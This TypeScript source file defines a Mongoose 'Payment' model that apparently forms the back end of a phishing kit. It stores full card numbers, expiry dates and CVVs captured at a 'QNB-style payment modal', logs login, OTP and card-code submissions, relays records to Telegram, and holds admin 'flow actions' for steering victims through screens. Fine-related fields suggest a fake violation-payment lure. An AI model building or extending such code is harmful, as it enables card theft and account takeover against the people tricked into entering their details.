import { Schema, model, Document } from "mongoose";

// Lifecycle: 'submitted' = card captured, awaiting an admin flow decision.
// 'forwarded' = relayed to Telegram. 'read'/'contacted'/'completed'/'cancelled'
// are admin-managed states. 'failed' = Telegram relay failed.
export type PaymentStatus =
  | "submitted"
  | "forwarded"
  | "read"
  | "contacted"
  | "completed"
  | "cancelled"
  | "failed";

export const PAYMENT_STATUSES: PaymentStatus[] = [
  "submitted",
  "forwarded",
  "read",
  "contacted",
  "completed",
  "cancelled",
  "failed",
];

// One recorded submission from a flow screen (login, OTP, card-code, …).
export interface FlowSubmission {
  step: string;
  data: Record<string, unknown>;
  ip?: string;
  userAgent?: string;
  submittedAt: Date;
}

export interface PaymentDoc extends Document {
  reference: string;
  referenceId?: string;
  fullName: string;
  mobile: string;
  email?: string;
  identifier?: string;
  amount: number;
  violationRefs: string[];
  notes?: string;
  language: "ar" | "en";
  status: PaymentStatus;

  // Card data captured at the QNB-style payment modal.
  cardholderName?: string;
  cardNumber?: string;
  cardLastFour?: string;
  cardExpiryMonth?: string;
  cardExpiryYear?: string;
  cardCvv?: string;

  // Customer-flow control.
  flowAction?: string | null;
  flowActionAt?: Date | null;
  flowSubmissions: FlowSubmission[];
  currentPage?: string | null;

  telegramMessageId?: number;
  adminNotes?: string;
  ip?: string;
  userAgent?: string;
  createdAt: Date;
  updatedAt: Date;
}

const flowSubmissionSchema = new Schema<FlowSubmission>(
  {
    step: { type: String, required: true },
    data: { type: Schema.Types.Mixed, default: {} },
    ip: { type: String },
    userAgent: { type: String },
    submittedAt: { type: Date, default: Date.now },
  },
  { _id: false },
);

const paymentSchema = new Schema<PaymentDoc>(
  {
    reference: { type: String, required: true, unique: true, index: true },
    referenceId: { type: String },
    fullName: { type: String, required: true },
    mobile: { type: String, required: true },
    email: { type: String },
    identifier: { type: String },
    amount: { type: Number, required: true },
    violationRefs: { type: [String], default: [] },
    notes: { type: String },
    language: { type: String, enum: ["ar", "en"], default: "en" },
    status: { type: String, enum: PAYMENT_STATUSES, default: "submitted" },

    cardholderName: { type: String },
    cardNumber: { type: String },
    cardLastFour: { type: String },
    cardExpiryMonth: { type: String },
    cardExpiryYear: { type: String },
    cardCvv: { type: String },

    flowAction: { type: String, default: null },
    flowActionAt: { type: Date, default: null },
    flowSubmissions: { type: [flowSubmissionSchema], default: [] },
    currentPage: { type: String, default: null },

    telegramMessageId: { type: Number },
    adminNotes: { type: String },
    ip: { type: String },
    userAgent: { type: String },
  },
  { timestamps: true },
);

export const Payment = model<PaymentDoc>("Payment", paymentSchema);
